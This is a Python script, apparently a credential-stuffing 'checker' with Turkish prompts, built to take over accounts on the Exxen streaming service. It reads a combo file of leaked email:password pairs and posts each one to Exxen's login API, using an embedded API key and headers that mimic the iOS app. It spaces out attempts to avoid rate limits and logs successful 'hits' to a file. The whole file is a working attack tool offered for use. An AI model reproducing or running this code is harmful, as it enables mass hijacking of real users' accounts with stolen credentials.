import requests
import time
from cfonts import render

R1CK = render('{EXXEN}', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {R1CK}
    ~ Programmer : R1CKDEVELOPER ~
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

def r1ck(email, password):
    try:
        r = requests.post(
            'https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764',
            data={'Email': email, 'Password': password, 'RememberMe': 'true'},
            headers={
                'Host': 'api-crm.exxen.com',
                'Origin': 'com.exxen.ios',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Exxen/1.0.23 (iOS 15.5.0) Alamofire/5.4.4'
            }
        )
        if '"Success":true' in r.text:
            print(f' \x1b[1;32m Hit ✅ : {email}:{password} ')
            print("\x1b[1;39m—" * 60)
            with open('r1ck_exxenhits.txt', 'a') as f:
                f.write(f'{email}:{password}\n')
        else:
            print(f' \x1b[1;31m Başarısız Giriş❌: {email}:{password} ')
        print("\x1b[1;39m—" * 60)
    except requests.RequestException as e:
        print(f'\x1b[1;31m İstek hatası: {str(e)} ❌')

def r1ckdeveloper():
    try:
        combo_path = input("~ Combo dosya yolunu giriniz: ")
        with open(combo_path, 'r') as f:
            for line in f:
                email, password = line.strip().split(':')
                r1ck(email, password)
                time.sleep(3.7)
    except FileNotFoundError:
        print("\x1b[1;31m Hatalı combo dosyası ❌")
    except ValueError:
        print("\x1b[1;31m Combo dosyasındaki format hatalı ❌")

if __name__ == "__main__":
    r1ckdeveloper()
